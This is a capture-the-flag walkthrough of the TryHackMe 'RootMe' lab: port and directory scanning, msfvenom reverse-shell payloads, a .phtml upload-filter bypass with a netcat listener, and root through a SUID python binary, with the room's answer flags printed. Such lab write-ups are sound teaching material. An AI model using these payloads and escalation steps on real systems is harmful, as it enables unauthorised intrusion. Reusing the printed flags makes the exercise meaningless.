![RootMe Banner](https://assets.tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Cover.png" alt="RootMe Logo">
</p>

# RootMe

This guide contains the answer and steps necessary to get to them for the [RootMe](https://tryhackme.com/room/rrootme) room.

## Table of contents

- [Reconnaissance](#reconnaissance)
- [Getting a shell](#getting-a-shell)
- [Privilege escalation](#privilege-escalation)

### Reconnaissance

1. Scan the machine, how many ports are open?

   We use `nmap` for this with:

   ```console
   nmap -sV -sS 10.10.77.33 -p-     
   ```

   ![Recon Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Recon_Nmap.png)

   ><details><summary>Click for answer</summary>2</details>

2. What version of Apache is running?

   The Apache version can be seen from the scan. Otherwise add the `-sV` argument.

   ><details><summary>Click for answer</summary>2.4.29</details>

3. What service is running on port 22?

   This can also be found from the scan when using `-sV`.

   ><details><summary>Click for answer</summary>ssh</details>

4. Find directories on the web server using the GoBuster tool.

5. What is the hidden directory?

   Finding hidden directories, can be done with the following command:

   ```console
   gobuster dir -u 10.10.77.33:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
   ```

   ![Recon Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Recon_Directory.png)

   One of these is not a standard folder for a webserver.

   ><details><summary>Click for answer</summary>/panel/</details>

### Getting a shell

1. user.txt

   The first to do is create a reverse shell payload. My first attempt was to use `msfvenom` to create a linux reverse tcp shell and output it as an `.elf` file.

   ```console
   msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=10.10.82.70 LPORT=1337 -f elf -o letmein.elf
   ```

   ![Shell Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Payload.png)

   This can now be uploaded to the webserver.

   ![Shell Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Upload.png)

   Unfortunately, I did not get a connection as the files was simply downloaded. We need to try a different format. Php is another usefull format for a reverse shell.

   ```console
   msfvenom -p php/reverse_php LHOST=10.10.82.70 LPORT=1337 -f raw > letmein.php
   ```

   ![Shell Payload Php](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Payload_Php.png)

   ![Shell Upload Php Fail](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Upload_Php_Fail.png)

   The server doesn't let us upload a `.php` file. This might be bypassed by renaming the file extension. Simply renaming to `.jpg.php` did not work in this case, but `.phtml` did.

   ```console
   mv letmein.php letmein.phtml 
   ```

   ![Shell Upload Php Rename](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Upload_Php_Rename.png)

   ![Shell Upload Php Success](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Upload_Php_Success.png)

   Now that it is uploaded we start our listener again and click on the file we uploaded in the `/uploads/` directory.

   ```console
   nc -nlvp 1337
   ```

   ![Shell Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Directory.png)

   Although the shell is connecting to our machine, it never seems to be fully established. So another method is in order. A pre-made php reverse shell can be obtained from 'pentestmonkey' on [github](https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php).

   ![Shell Php Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Php_Script.png)

   We only need to add our own IP and port to listen on.

   ![Shell Php Script Edit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Php_Script_Edit.png)

   Save this file with the `phtml` extension en upload to the server. Setup the listener on port 1337 and execute the file from the `/uploads` page.

   ![Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Connection.png)

   Success!

   Now we can search for the file `user.txt` and open it to get our flag.

   ```console
   find / -name user.txt 2>/dev/null
   ```

   ![Shell Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Shell_Flag.png)

   ><details><summary>Click for answer</summary>THM{y0u_g0t_a_sh3ll}</details>

### Privilege escalation

1. Search for files with SUID permission, which file is weird?

   Using: `find / -perm -4000 2>/dev/null` we can search for any binaries with their SUID bit set.

   ![Priv SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Priv_SUID.png)

   ><details><summary>Click for answer</summary>/usr/bin/python</details>

2. Find a form to escalate your privileges.

3. root.txt

   After we identify the outlier, we can go to the GTFO bins website to find out how we can abuse this specific binary.

   ![Priv Gtfo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Priv_Gtfo.png)

   We need to add the path to the python binary on this machine to the command. Then we can simply run it in our shell.

   ```console
   /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
   ```

   ![Priv Escalation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Priv_Escalation.png)

   We got root access!

   Now lets search for the root flag.

   ```console
   find /root -name root.txt 2>/dev/null
   ```

   ![Priv Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/rrootme/Rootme_Priv_Root_Flag.png)

   ><details><summary>Click for answer</summary>THM{pr1v1l3g3_3sc4l4t10n}</details>